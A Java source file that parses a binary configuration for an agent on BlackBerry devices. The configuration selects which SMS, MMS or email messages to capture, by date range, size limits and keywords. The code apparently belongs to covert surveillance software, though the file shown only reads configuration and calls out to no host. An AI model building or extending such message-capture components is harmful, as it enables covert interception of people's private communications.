package blackberry.agent;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;

class Filter {
    //#debug
    static Debug debug = new Debug("Filter", DebugLevel.VERBOSE);

    public static final int TYPE_REALTIME = 0;
    public static final int TYPE_COLLECT = 1;

    public static final int CLASS_UNKNOWN = 0;
    public static final int CLASS_SMS = 1;
    public static final int CLASS_MMS = 2;
    public static final int CLASS_EMAIL = 3;

    public long size;

    public long version;
    public long type;
    public byte[] classname;
    public int classtype;

    public boolean enabled;
    public boolean all;
    public boolean doFilterFromDate;
    public long fromDate;
    public boolean doFilterToDate;
    public long toDate;
    public long maxMessageSize;
    public long maxMessageSizeToLog;

    public Vector keywords = new Vector();

    boolean valid;

    public int payloadStart;

    public Filter(final byte[] conf, final int offset, final int length) {
        final int headerSize = 116;
        final int classNameLen = 32;
        final int confSize = conf.length - offset;

        Check.requires(confSize >= headerSize, "conf smaller than needed");

        final Prefix headerPrefix = new Prefix(conf, offset);

        if (!headerPrefix.isValid()) {
            return;
        }

        final DataBuffer databuffer = new DataBuffer(conf,
                headerPrefix.payloadStart, headerPrefix.length, false);

        //#ifdef DBC
        Check.asserts(headerPrefix.type == Prefix.TYPE_HEADER,
                "Wrong prefix type");
        Check.asserts(headerSize == headerPrefix.length, "Wrong prefix length");
        //#endif

        // LETTURA del HEADER
        try {

            size = databuffer.readInt();
            version = databuffer.readInt();
            type = databuffer.readInt();
            classname = new byte[classNameLen];
            databuffer.read(classname);

            final String classString = WChar.getString(classname, true);
            if (classString.equals("IPM.SMSText*")) {
                classtype = Filter.CLASS_SMS;
            } else if (classString.equals("IPM.Note*")) {
                classtype = Filter.CLASS_EMAIL;
            } else if (classString.equals("IPM.MMS*")) {
                classtype = Filter.CLASS_MMS;
            } else {
                classtype = Filter.CLASS_UNKNOWN;
                //#debug
                debug.error("classtype unknown: " + classString);
            }

            //#debug
            debug.trace("classname: " + classString);

            enabled = databuffer.readBoolean();
            all = databuffer.readBoolean();
            doFilterFromDate = databuffer.readBoolean();
            fromDate = databuffer.readLong();
            doFilterToDate = databuffer.readBoolean();
            toDate = databuffer.readLong();
            maxMessageSize = databuffer.readLong();
            maxMessageSizeToLog = databuffer.readLong();

            payloadStart = (int) (headerPrefix.payloadStart + size);

            valid = true;
        } catch (final EOFException e) {
            valid = false;

        }

        // Lettura delle KEYWORDS
        if (length > headerPrefix.length) {
            // ogni keyword ha il suo prefix
            final int endOffset = offset + length;
            int keywordOffset = offset + headerSize + Prefix.LEN;

            while (keywordOffset < endOffset) {
                final Prefix keywordPrefix = new Prefix(conf, keywordOffset);

                //#ifdef DBC
                Check.asserts(keywordPrefix.type == Prefix.TYPE_KEYWORD,
                        "Wrong prefix type");
                //#endif

                final String keyword = WChar.getString(conf, keywordOffset,
                        keywordPrefix.length, false);
                keywordOffset += keywordPrefix.length + Prefix.LEN;

                debug.trace("Keyword: " + keyword);
                keywords.addElement(keyword);
            }
        }
    }

    public boolean isValid() {
        return valid;
    }
}
